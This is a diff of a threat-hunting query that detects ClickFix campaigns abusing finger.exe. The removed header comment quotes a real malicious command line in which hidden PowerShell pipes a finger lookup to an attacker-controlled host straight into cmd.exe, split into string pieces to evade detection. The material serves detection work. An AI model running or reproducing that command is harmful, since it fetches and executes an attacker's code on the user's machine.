@@ -1,21 +1,3 @@
-// Hunt: ClickFix finger protocol abuse
-// Table: DeviceCustomScriptEvents
-// Source: pattern confirmed against a real in-the-wild ClickFix command
-//         line: "cmd.exe" /c start "" /min powershell -c "& powershell
-//         ('-Windo' + 'wStyle') ('hid' + 'den') -c finger
-//         mag@finger.captchamag.com | C:\WINDOWS\system32\cmd.exe".
-// Purpose: finger.exe is a living off the land binary that performs a
-//          lookup against a remote finger server on TCP port 79, a
-//          protocol rarely monitored or blocked by modern network
-//          controls. Threat actors abuse it as a covert retrieval channel,
-//          piping the response of a finger query shaped like
-//          user@attacker-domain straight into cmd.exe or powershell for
-//          execution. None of the other hunts in this set look for finger
-//          specifically, this closes that gap.
-// Validated: success. Regex confirmed via print against the literal
-//          command text above, correctly isolating
-//          "finger mag@finger.captchamag.com". Returns 0 rows when no
-//          finger-based retrieval pattern is present, a clean result.
 // Flags finger.exe used with a user@host argument, a covert
 // retrieval channel over an unmonitored port that ClickFix campaigns abuse.
 DeviceCustomScriptEvents
